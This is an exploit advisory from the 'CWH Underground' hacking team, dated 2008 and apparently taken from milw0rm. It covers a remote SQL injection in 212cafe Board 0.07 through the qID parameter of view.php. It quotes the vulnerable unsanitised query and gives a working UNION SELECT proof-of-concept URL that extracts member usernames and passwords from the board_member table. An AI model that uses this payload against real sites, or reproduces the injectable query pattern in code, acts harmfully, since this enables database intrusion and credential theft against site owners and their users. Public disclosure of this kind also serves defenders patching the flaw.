@@ -1,0 +1,58 @@
+===================================================================
+  212cafe Board (view.php qID) Remote SQL Injection Vulnerability
+===================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+AUTHOR : CWH Underground
+DATE   : 26 September 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+APPLICATION : 212cafe Board 
+VERSION     : 0.07
+VENDOR      : http://www.212cafe.com/
+DOWNLOAD    : http://php.deeserver.net/download/get/12/212cafeboard_v0_07.zip
+#####################################################
+
+--- Remote SQL Injection ---
+
+** Magic Quote must turn off **
+
+-----------------------------------
+ Vulnerable File (view.php)
+-----------------------------------
+
+$query="SELECT * FROM board_question WHERE (qID='$qID')";
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[212cafeboard]/view.php?qID=[SQL Injection]
+
+
+------
+ POC
+------
+
+[+] http://[Target]/[212cafeboard]/view.php?qID=-9999')/**/UNION/**/SELECT/**/1,concat(mUser,0x3a3a,mPasswd),3,4,5,6,7,8,9,10,11,12,13,14,15,16/**/FROM/**/board_member/**/WHERE/**/(mID='1
+
+
+#####################################################################
+Greetz      : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos
+Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+#####################################################################
+
+# milw0rm.com [2008-09-26]
